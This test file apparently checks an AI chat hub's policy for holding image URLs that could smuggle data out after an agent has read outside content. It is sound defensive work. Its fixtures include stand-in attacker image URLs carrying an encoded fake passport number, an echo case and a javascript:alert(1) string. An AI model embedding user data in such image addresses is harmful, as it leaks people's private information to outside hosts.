// Pictures (policy/pictures.ts): the hub fetches a picture a chat shows only when the session that made it could not
// have put data into its address: before outside content, or a picture found in it, given by the person, or plain on a
// host they named. Anything else is held until the person taps Show.
import { describe, expect, it } from "vitest";
import { openDb } from "../src/db.ts";
import { EgressGuard, type EgressGiven } from "../src/policy/egress.ts";
import { markdownPictures, partPictures, Pictures, picturesIn } from "../src/policy/pictures.ts";

const nobody = (texts: string[] = [], known: string[] = []): (() => EgressGiven) => () => ({ texts, knownHost: (h) => known.includes(h) });
const secret = Buffer.from("passport 4510 123456").toString("base64");

describe("the pictures a text shows", () => {
  it("image destinations in any Markdown form, not links", () => {
    expect(markdownPictures("Here ![owl](https://img.example.com/owl.jpg) and [a page](https://news.example.com/a)")).toEqual(["https://img.example.com/owl.jpg"]);
    expect(markdownPictures('![a](https://img.example.com/a.png "A title")')).toEqual(["https://img.example.com/a.png"]);
    expect(markdownPictures("![a](<https://img.example.com/a b.png>)")).toEqual(["https://img.example.com/a%20b.png"]);
    expect(markdownPictures("![a [nested] alt](https://img.example.com/n.png)")).toEqual(["https://img.example.com/n.png"]);
    expect(markdownPictures("![](https://upload.wikimedia.org/File:Owl_(bird).jpg)")).toEqual(["https://upload.wikimedia.org/File:Owl_(bird).jpg"]);
    expect(markdownPictures("![кот](https://ru.wikipedia.org/wiki/Кот.jpg)")).toEqual(["https://ru.wikipedia.org/wiki/%D0%9A%D0%BE%D1%82.jpg"]);
    // A reference definition an image may use.
    expect(markdownPictures("![x][r]\n\n[r]: https://pics.example.net/r.png")).toEqual(["https://pics.example.net/r.png"]);
    for (const none of ["![a](file:chart.png)", "![a](/api/files?path=x.png)", "! [a](https://x.example/a.png)", "![unclosed (https://x.example/a.png)", "plain https://x.example/a.png"]) {
      expect(markdownPictures(none), none).toEqual([]);
    }
  });

  it("escapes and entities: every address the client may read is decided", () => {
    expect(markdownPictures("![](https://attacker.example/p.png?d=se\\_cret)")).toEqual(["https://attacker.example/p.png?d=se\\_cret", "https://attacker.example/p.png?d=se_cret"]);
    expect(markdownPictures("![](https://attacker.example/p.png?d=&#115;ecret&amp;x=1)")).toContain("https://attacker.example/p.png?d=secret&x=1");
  });

  it("a tool's picture fields and Markdown in its texts; a link to open is not a picture", () => {
    expect(picturesIn({ images: [{ url: "https://img.example.com/a.jpg", caption: "A" }, { path: "chart.png" }] })).toEqual(["https://img.example.com/a.jpg"]);
    expect(picturesIn({ items: [{ title: "News", url: "https://news.example.com/1", image: "https://cdn.example.com/1.jpg" }] })).toEqual(["https://cdn.example.com/1.jpg"]);
    expect(picturesIn({ title: "Post", text: "Look ![x](https://cdn.example.com/x.png)", image: "https://cdn.example.com/og.png" })).toEqual(["https://cdn.example.com/x.png", "https://cdn.example.com/og.png"]);
    expect(picturesIn({ title: "Page", cover: "https://cdn.example.com/cover.png" })).toEqual(["https://cdn.example.com/cover.png"]);
    expect(picturesIn({ url: "https://news.example.com/1" })).toEqual([]);
  });

  it("stored parts: images, news pictures, words and notes", () => {
    expect(
      partPictures([
        { type: "images", items: [{ src: "https://img.example.com/a.jpg" }, { src: "file:x/chart.png" }] },
        { type: "news", items: [{ title: "N", image: "https://cdn.example.com/n.jpg" }, { title: "M" }] },
        { type: "text", text: "![t](https://img.example.com/t.png)" },
        { type: "notification", level: "silent", title: "R", body: "![b](https://img.example.com/b.png)" },
      ]),
    ).toEqual(["https://img.example.com/a.jpg", "https://cdn.example.com/n.jpg", "https://img.example.com/t.png", "https://img.example.com/b.png"]);
  });
});

describe("the verdicts", () => {
  const setup = () => {
    const guard = new EgressGuard();
    return { guard, pictures: new Pictures(openDb(":memory:"), guard) };
  };

  it("before outside content every picture is shown; after, only those that carry nothing new", () => {
    const { guard, pictures } = setup();
    const made = `https://pics.attacker.test/p.png?d=${secret}`;
    pictures.decide({ id: "clean", tainted: false }, [made], nobody());
    expect(pictures.state(made)).toBe("shown");

    const leak = `https://pics.attacker.test/p.png?d=${secret}x`;
    guard.read("s", "<p>An owl ![](https://upload.wikimedia.org/owl.jpg) Picture: https://news.example.org/og.png</p>");
    const urls = [leak, "https://upload.wikimedia.org/owl.jpg", "https://news.example.org/og.png", "https://img.habr.com/a.png", `https://habr.com/i.png?d=${secret}`, "https://pics.example.net/given.png"];
    pictures.decide({ id: "s", tainted: true }, urls, nobody(["Что на habr.com? Вот картинка https://pics.example.net/given.png"]));
    expect(urls.map((u) => pictures.state(u))).toEqual(["held", "shown", "shown", "shown", "held", "shown"]);
  });

  it("a found picture on a host the agent wrote into a call first may be its own: held", () => {
    const { guard, pictures } = setup();
    guard.wrote("s", { text: "post this: https://pics.attacker.test/" });
    guard.read("s", "![](https://pics.attacker.test/echo.png?d=4510)");
    pictures.decide({ id: "s", tainted: true }, ["https://pics.attacker.test/echo.png?d=4510"], nobody());
    expect(pictures.state("https://pics.attacker.test/echo.png?d=4510")).toBe("held");
  });

  it("shown wins and stays; Show turns a held one; addresses compare as the proxy reads them", () => {
    const { guard, pictures } = setup();
    const url = "https://pics.attacker.test/p.png?d=4510";
    pictures.decide({ id: "s", tainted: true }, [url], nobody());
    expect(pictures.state(url)).toBe("held");
    // Found later by another session: the same bytes, nothing new in them.
    guard.read("t", `see ${url}`);
    pictures.decide({ id: "t", tainted: true }, [url], nobody());
    expect(pictures.state("https://PICS.attacker.test/p.png?d=4510")).toBe("shown");
    pictures.decide({ id: "u", tainted: true }, [url], nobody());
    expect(pictures.state(url)).toBe("shown");

    const other = "https://pics.attacker.test/q.png?d=1";
    pictures.decide({ id: "u", tainted: true }, [other], nobody());
    expect(pictures.show(other)).toBe(true);
    expect(pictures.state(other)).toBe("shown");
    expect(pictures.show("javascript:alert(1)")).toBe(false);
    expect(pictures.state("https://never.example/x.png")).toBeUndefined();
    pictures.trust(["https://mine.example/me.png"]);
    expect(pictures.state("https://mine.example/me.png")).toBe("shown");
  });

  it("content from before pictures were decided counts as shown, once", () => {
    const db = openDb(":memory:");
    const now = new Date().toISOString();
    db.prepare("insert into messages(id, conversation_id, role, parts, status, created_at) values (?,?,?,?,?,?)").run(
      "m1",
      "c1",
      "assistant",
      JSON.stringify([
        { type: "text", text: "![old](https://img.example.com/old.png)" },
        { type: "images", items: [{ src: "https://img.example.com/carousel.jpg" }] },
      ]),
      "complete",
      now,
    );
    db.prepare("insert into feeds(id, title, brief, agent_id, times, weekdays, sources, enabled, created_at, updated_at) values ('f','F','','a','[]','[]','[]',1,?,?)").run(now, now);
    db.prepare("insert into feed_posts(id, feed_id, title, text, image, created_at) values ('p','f','T','![in](https://cdn.example.com/in.png)','https://cdn.example.com/post.jpg',?)").run(now);
    const pictures = new Pictures(db, new EgressGuard());
    pictures.backfill();
    for (const u of ["https://img.example.com/old.png", "https://img.example.com/carousel.jpg", "https://cdn.example.com/post.jpg", "https://cdn.example.com/in.png"]) expect(pictures.state(u), u).toBe("shown");
    // Once: what comes later is decided as it is stored.
    db.prepare("insert into messages(id, conversation_id, role, parts, status, created_at) values ('m2','c1','assistant',?,'complete',?)").run(JSON.stringify([{ type: "text", text: "![new](https://img.example.com/new.png)" }]), now);
    pictures.backfill();
    expect(pictures.state("https://img.example.com/new.png")).toBeUndefined();
  });
});
